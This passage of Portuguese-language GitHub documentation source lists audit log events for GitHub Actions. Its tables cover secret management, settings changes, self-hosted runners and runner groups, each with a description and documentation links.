| `environment.remove_actions_secret` |  Acionada quando um segredo é removido de um ambiente. Para obter mais informações, confira "[Segredos do ambiente](/actions/reference/environments#environment-secrets)".
| `environment.update_actions_secret` | Acionada quando um segredo em um ambiente é atualizado. Para obter mais informações, confira "[Segredos do ambiente](/actions/reference/environments#environment-secrets)".
{% endif %}

{% ifversion fpt or ghes or ghec %}
### Eventos para alterações nas configurações
| Ação | Descrição
|------------------|-------------------
| `repo.actions_enabled` | Acionada quando {% data variables.product.prodname_actions %} está habilitado para um repositório. Pode ser visto usando a interface do usuário. Este evento não fica visível quando você acessar o log de auditoria usando a API REST. Para obter mais informações, confira "[Como usar a API REST](#using-the-rest-api)".
| `repo.update_actions_access_settings` | Disparada quando a configuração usada para controlar como seu repositório é usado pelos fluxos de trabalho do {% data variables.product.prodname_actions %} em outros repositórios é alterada.
{% endif %}

### Eventos para gerenciamento de segredo
| Ação | Descrição
|------------------|-------------------
| `org.create_actions_secret` | Acionada quando um segredo {% data variables.product.prodname_actions %} é criado na organização. Para obter mais informações, confira "[Como criar segredos criptografados para uma organização](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)".
| `org.remove_actions_secret` | Acionada quando um segredo {% data variables.product.prodname_actions %} é removido.
| `org.update_actions_secret` | Acionada quando um segredo {% data variables.product.prodname_actions %} é atualizado.
| `repo.create_actions_secret ` | Acionada quando um segredo {% data variables.product.prodname_actions %} é criado em um repositório. Para obter mais informações, confira "[Como criar segredos criptografados para um repositório](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)".
| `repo.remove_actions_secret` | Acionada quando um segredo {% data variables.product.prodname_actions %} é removido.
| `repo.update_actions_secret` | Acionada quando um segredo {% data variables.product.prodname_actions %} é atualizado.

### Eventos para executores auto-hospedados
| Ação | Descrição
|------------------|-------------------
| `enterprise.register_self_hosted_runner` | Acionada quando um novo executor auto-hospedado é registrado. Para obter mais informações, confira "[Como adicionar um executor auto-hospedado a uma empresa](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)".
| `enterprise.remove_self_hosted_runner` | Acionada quando um executor auto-hospedado é removido.
| `enterprise.runner_group_runners_updated` | Acionada quando a lista de membros do grupo do executor é atualizada. Para obter mais informações, confira "[Definir executores auto-hospedados em um grupo de uma organização](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)".
| `enterprise.self_hosted_runner_online` | Acionada quando o aplicativo do executor é iniciado. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, confira "[Como verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `enterprise.self_hosted_runner_offline` | Acionada quando o aplicativo do executor é interrompido. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, confira "[Como verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `enterprise.self_hosted_runner_updated` | Acionada quando o executor é atualizado. Pode ser visualizado usando a API REST e a interface do usuário. Este evento não está incluído quando você exportar o log de auditoria como dados JSON ou um arquivo CSV. Para obter mais informações, confira "[Sobre os executores auto-hospedados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)" e "[Como revisar o log de auditoria da sua organização](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)".
| `org.register_self_hosted_runner` | Acionada quando um novo executor auto-hospedado é registrado. Para obter mais informações, confira "[Como adicionar um executor auto-hospedado a uma organização](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)".
| `org.remove_self_hosted_runner` | Acionada quando um executor auto-hospedado é removido. Para obter mais informações, confira [Como remover um executor de uma organização](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization).
| `org.runner_group_runners_updated` | Acionada quando a lista de integrantes do grupo de executor é atualizada. Para obter mais informações, confira "[Definir executores auto-hospedados em um grupo de uma organização](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)".
| `org.runner_group_updated` | Acionada quando a configuração de um grupo de executor auto-hospedado é alterada. Para obter mais informações, confira "[Como alterar a política de acesso de um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)".
| `org.self_hosted_runner_online` | Acionada quando o aplicativo do executor é iniciado. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, confira "[Como verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `org.self_hosted_runner_offline` | Acionada quando o aplicativo do executor é interrompido. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, confira "[Como verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `org.self_hosted_runner_updated` | Acionada quando o executor é atualizado. Pode ser visto usando a API REST e a interface do usuário; não visível na exportação de JSON/CSV. Para obter mais informações, confira "[Sobre os executores auto-hospedados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)".
| `repo.register_self_hosted_runner` | Acionada quando um novo executor auto-hospedado é registrado. Para obter mais informações, confira "[Como adicionar um executor auto-hospedado a um repositório](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)".
| `repo.remove_self_hosted_runner` | Acionada quando um executor auto-hospedado é removido. Para obter mais informações, confira "[Como remover um executor de um repositório](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)".
| `repo.self_hosted_runner_online` | Acionada quando o aplicativo do executor é iniciado. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, confira "[Como verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `repo.self_hosted_runner_offline` | Acionada quando o aplicativo do executor é interrompido. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, confira "[Como verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".
| `repo.self_hosted_runner_updated` | Acionada quando o executor é atualizado. Pode ser visto usando a API REST e a interface do usuário; não visível na exportação de JSON/CSV. Para obter mais informações, confira "[Sobre os executores auto-hospedados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)".

### Eventos para grupos de executores auto-hospedados
| Ação | Descrição
|------------------|-------------------
| `enterprise.runner_group_created` | Acionada quando um grupo de executores auto-hospedado é criado. Para obter mais informações, confira "[Como criar um grupo de executores auto-hospedados para uma empresa](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)".
| `enterprise.runner_group_removed` | Acionada quando um grupo de executores auto-hospedados é removido. Para obter mais informações, confira "[Como remover um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)".
| `enterprise.runner_group_runner_removed` | Acionada quando a API REST é usada para remover um executor auto-hospedado de um grupo.
| `enterprise.runner_group_runners_added` | Acionada quando um executor auto-hospedado é adicionado a um grupo. Para obter mais informações, confira "[Como mover um executor auto-hospedado para um grupo](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)".
| `enterprise.runner_group_updated` |Acionada quando a configuração de um grupo de executor auto-hospedado é alterada. Para obter mais informações, confira "[Como alterar a política de acesso de um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)".
| `org.runner_group_created` | Acionada quando um grupo de executores auto-hospedado é criado. Para obter mais informações, confira "[Como criar um grupo de executores auto-hospedados para uma organização](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)".
| `org.runner_group_removed` | Acionada quando um grupo de executores auto-hospedados é removido. Para obter mais informações, confira "[Como remover um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)".
| `org.runner_group_updated` | Acionada quando a configuração de um grupo de executor auto-hospedado é alterada. Para obter mais informações, confira "[Como alterar a política de acesso de um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)".
| `org.runner_group_runners_added` | Acionada quando um executor auto-hospedado é adicionado a um grupo. Para obter mais informações, confira "[Como mover um executor auto-hospedado para um grupo](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)".
| `org.runner_group_runner_removed` | Acionada quando a API REST é usada para remover um executor auto-hospedado de um grupo. Para obter mais informações, confira "[Remover um executor auto-hospedado de um grupo de uma organização](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)".

### Eventos para atividades no fluxo de trabalho

{% data reusables.actions.actions-audit-events-workflow %}
